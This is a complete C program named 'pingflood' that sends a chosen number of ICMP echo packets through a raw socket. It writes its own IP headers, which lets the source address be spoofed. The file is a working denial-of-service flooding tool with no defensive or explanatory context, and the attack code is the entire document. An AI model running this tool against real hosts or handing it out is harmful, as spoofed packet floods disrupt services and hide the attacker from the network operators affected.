#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>	/* For bcopy function */
#include <netdb.h>

#define MAX_LEN 400
#define DELAY 3000

void fatal(char* message)
{
	printf("%s\n", message);
	exit(1);
}

int main(int argc , char* argv[])
{
	int sock, on, n,i=0;
	char send_buff[MAX_LEN];
	struct ip *iphdr = (struct ip*)send_buff;
	struct icmp *icmphdr = (struct icmp*)(iphdr+1);
	struct sockaddr_in src_addr , dest_addr;
	struct hostent *hp_src,  *hp_dst;

	if(argc<4)
	{
		fatal("Usage: ./pingflood <src_addr> <dest_addr> <num_of_packets>");
	}

	on = 1;
	n = atoi(argv[3]);
	memset(send_buff , 0 , sizeof(send_buff));

	if((hp_src=gethostbyname(argv[1]))==NULL)
	{
		if((iphdr->ip_src.s_addr=inet_addr(argv[1]))==-1)
		{
			fatal("Can't resolve hostname 1");
		}
	}
	else
	{
		bcopy(hp_src->h_addr , &iphdr->ip_src.s_addr , hp_src->h_length);
	}

	if((hp_dst=gethostbyname(argv[2]))==NULL)
	{
		if((iphdr->ip_dst.s_addr=inet_addr(argv[2]))==-1)
		{
			fatal("Can't resolve hostname 2");
		}
	}
	else
	{
		bcopy(hp_dst->h_addr , &iphdr->ip_dst.s_addr , hp_dst->h_length);
	}

	if((sock=socket(AF_INET , SOCK_RAW,  IPPROTO_ICMP))==-1)
	{
		fatal("Error in opening the socket");
	}

	if(setsockopt(sock, IPPROTO_IP , IP_HDRINCL , &on , sizeof(on))==-1)
	{
		fatal("sockopt");
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_addr = iphdr->ip_dst;

	/* IP Headers */
	iphdr->ip_v = 4;
	iphdr->ip_hl = 5;
	iphdr->ip_tos = 0;
	iphdr->ip_len = htons(sizeof(send_buff));
	iphdr->ip_id = htons(321);
	iphdr->ip_off = htons(0);
	iphdr->ip_ttl = 255;
	iphdr->ip_p = IPPROTO_ICMP;
	iphdr->ip_sum = 0;

	/* ICMP Headers */
	icmphdr->icmp_type = ICMP_ECHO;
	icmphdr->icmp_code = 0;
	icmphdr->icmp_cksum = htons(~(ICMP_ECHO << 8));

	for(i = 0 ; i<n ; i++)
	{
		if(sendto(sock , send_buff , sizeof(send_buff), 0 , (struct sockaddr*)&dest_addr, sizeof(dest_addr))==-1)
		{
			fatal("Failed to send");
		}
		else
		{
			printf("Sendto successful\n");
		}

		usleep(DELAY);
	}

	close(sock);


}